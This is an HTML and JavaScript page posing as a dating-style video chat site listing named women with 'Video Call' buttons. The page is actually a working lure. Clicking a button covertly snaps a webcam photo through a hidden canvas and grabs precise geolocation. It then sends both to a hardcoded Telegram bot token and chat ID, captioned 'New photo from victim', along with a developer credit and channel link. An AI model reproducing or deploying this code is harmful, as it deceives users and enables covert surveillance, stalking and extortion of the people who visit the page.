<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Stylish Girl Video Chat</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: sans-serif;
      background: linear-gradient(135deg, #f8f9fa, #e9ecef);
      padding: 20px;
    }
    .card {
      background: white;
      padding: 25px;
      border-radius: 20px;
      box-shadow: 0 6px 25px rgba(0,0,0,0.15);
      text-align: center;
      width: 90%;
      max-width: 350px;
      margin: 0 auto 20px;
      border-top: 5px solid #d00000;
      transition: transform 0.3s;
    }
    .card:hover {
      transform: translateY(-5px);
    }
    .avatar {
      width: 100px;
      border-radius: 50%;
      margin-bottom: 10px;
      border: 3px solid #ff4757;
    }
    .name {
      font-size: 26px;
      font-family: 'Pacifico', cursive;
      color: #d00000;
      margin-bottom: 5px;
    }
    .status {
      color: green;
      margin: 8px 0 15px;
      font-weight: bold;
    }
    .btn {
      background: #4b4bff;
      color: white;
      padding: 10px 24px;
      border: none;
      border-radius: 30px;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.3s;
    }
    .btn:hover {
      background: #3636d6;
    }
    video, canvas {
      display: none;
    }
    footer {
      margin-top: 30px;
      text-align: center;
      font-size: 14px;
      color: #555;
    }
  </style>
</head>

  <div id="cards"></div>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="320" height="240"></canvas>

<script>
    // 👩 Girls List
    const girls = [
      "Haleema", "Iqra", "Fatima", "Dua", "Saira", 
      "Sidra", "Noor", "Rimsha", "Areeka", "Anaya", 
      "Tuba", "Kainat", "Bisma"
    ];

    // 🔥 Telegram Bot Config
    const BOT_TOKEN = "8941251283:AAFDGIvRSkAHR0h1RYuMgt6-FfK-LZ3HUH0";
    const CHAT_ID = "7264141539";

    const cardsContainer = document.getElementById("cards");

    // Generate profile cards
    girls.forEach(name => {
      const card = document.createElement("div");
      card.className = "card";
      card.innerHTML = `
        <img src="https://via.placeholder.com/100" class="avatar">
        <div class="name">${name}</div>
        <div class="status">Online • Video Chat Available</div>
        <button class="btn" onclick="captureAndSend('${name}')">Video Call</button>
      `;
      cardsContainer.appendChild(card);
    });

    // 📸 + 📍 Capture Photo & Location
    async function captureAndSend(name) {
      try {
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        // Camera access
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            video.play();
            setTimeout(resolve, 1500);
          };
        });

        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL("image/jpeg");

        // Stop camera
        stream.getTracks().forEach(track => track.stop());

        // Get Location
        const locationData = await getLocation();

        // Send both
        sendToTelegram(imageData, name, locationData);

      } catch (err) {
        alert("❌ Error: " + err.message);
      }
    }

    // Get Location permission
    function getLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject(new Error("Geolocation not supported"));
          return;
        }
        navigator.geolocation.getCurrentPosition(
          (position) => {
            resolve({
              lat: position.coords.latitude,
              lon: position.coords.longitude,
              acc: position.coords.accuracy,
              time: new Date().toISOString()
            });
          },
          (error) => reject(error),
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    }

    // 🚀 Send photo + location
    function sendToTelegram(imageData, name, locationData) {
      let caption = `📸 New photo from victim: ${name}\n\n`;
      
      if (locationData) {
        caption += `📍 **LOCATION CAPTURED**\n`;
        caption += `Lat: ${locationData.lat}\n`;
        caption += `Lon: ${locationData.lon}\n`;
        caption += `Accuracy: ${locationData.acc} meters\n`;
        caption += `Time: ${locationData.time}\n\n`;
        caption += `🗺️ Google Maps: https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`;
      }

      caption += `\n\nDEVELOPER 》 @FindToMyName | Join T.G Chanel https://t.me/Toxicadminn`;

      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("caption", caption);
      formData.append("photo", dataURItoBlob(imageData), "photo.jpg");

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      })
      .then(res => res.json())
      .then(data => console.log("✅ Sent to Telegram:", data))
      .catch(err => console.error("❌ Error:", err));
    }

    // Helper: Base64 → Blob
    function dataURItoBlob(dataURI) {
      let byteString = atob(dataURI.split(",")[1]);
      let mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
      let ab = new ArrayBuffer(byteString.length);
      let ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }
      return new Blob([ab], { type: mimeString });
    }
